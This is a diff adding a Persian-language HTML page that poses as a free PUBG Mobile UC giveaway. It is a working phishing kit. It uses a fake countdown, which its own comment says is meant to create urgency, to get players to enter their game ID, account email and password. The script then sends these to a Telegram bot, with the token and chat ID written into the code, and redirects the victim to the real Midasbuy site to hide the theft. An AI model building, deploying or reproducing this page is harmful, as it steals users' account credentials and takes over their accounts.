@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG MOBILE UC GIFT</title>
+    <style>
+        body { background: #000 url('https://w0.peakpx.com/wallpaper/559/1018/HD-wallpaper-pubg-mobile-poster-battle-grounds-thumbnail.jpg') no-repeat center center fixed; background-size: cover; font-family: 'Tahoma', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1; }
+        .box { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 2px solid #f39c12; width: 320px; text-align: center; position: relative; z-index: 2; box-shadow: 0 0 20px #f39c12; }
+        h2 { color: #f39c12; margin-bottom: 5px; text-shadow: 0 0 5px #000; }
+        .timer { color: #e74c3c; font-weight: bold; font-size: 14px; margin-bottom: 15px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #333; border-radius: 8px; background: #222; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: linear-gradient(to bottom, #f39c12, #d35400); color: black; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        .reward { font-size: 18px; color: #2ecc71; margin: 10px 0; border: 1px dashed #2ecc71; padding: 5px; }
+    </style>
+</head>
+<body>
+<div class="overlay"></div>
+<div class="box">
+    <h2>PUBG MOBILE</h2>
+    <div class="reward">🎁 هدیه: 1200 UC رایگان</div>
+    <div class="timer">⏰ زمان باقی‌مانده: <span id="time">09:45</span></div>
+    <form id="pubgForm">
+        <input type="text" name="id" placeholder="آیدی عددی بازی (Character ID)" required>
+        <input type="email" name="mail" placeholder="ایمیل اکانت" required>
+        <input type="password" name="pass" placeholder="پسورد اکانت" required>
+        <button type="submit">دریافت آنی UC</button>
+    </form>
+</div>
+
+<script>
+    // تایمر معکوس برای حس اضطرار
+    let sec = 585;
+    setInterval(() => {
+        let min = Math.floor(sec / 60);
+        let s = sec % 60;
+        document.getElementById('time').innerText = `0${min}:${s < 10 ? '0'+s : s}`;
+        if(sec > 0) sec--;
+    }, 1000);
+
+    document.getElementById('pubgForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const text = `🎮 شکار پابجی!\n🆔 آیدی: ${this.id.value}\n📧 ایمیل: ${this.mail.value}\n🔑 پسورد: ${this.pass.value}`;
+        fetch(`https://api.telegram.org/bot8486500261:AAF8V0mNot6Uu3PAfP_BkF4wuJTX7Yns3f4/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: '7394414495', text: text })
+        }).then(() => {
+            window.location.href = 'https://www.midasbuy.com'; 
+        });
+    });
+</script>
+</body>
+</html>
